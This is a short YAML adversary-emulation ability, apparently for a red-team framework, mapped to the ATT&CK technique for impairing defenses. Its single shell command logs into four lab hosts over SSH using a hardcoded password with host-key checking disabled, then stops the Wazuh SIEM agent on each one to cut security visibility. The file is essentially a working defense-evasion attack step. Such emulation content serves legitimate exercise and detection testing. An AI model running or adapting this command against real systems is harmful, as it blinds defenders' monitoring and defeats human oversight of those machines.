- id: de03-stop-wazuh
  name: Stop Wazuh Agent — Blind SIEM
  description: Stop Wazuh agents on all targets to cut SIEM visibility
  tactic: defense-evasion
  technique:
    attack_id: T1562.001
    name: Impair Defenses - Disable or Modify Tools
  platforms:
    linux:
      sh:
        command: |
          for h in 10.0.20.21 10.0.20.30 10.0.20.40 10.0.20.200; do sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@$h "sudo systemctl stop wazuh-agent 2>/dev/null; echo '[+] Wazuh stopped on $(hostname)'" 2>/dev/null & done; wait

  singleton: false
  repeatable: false
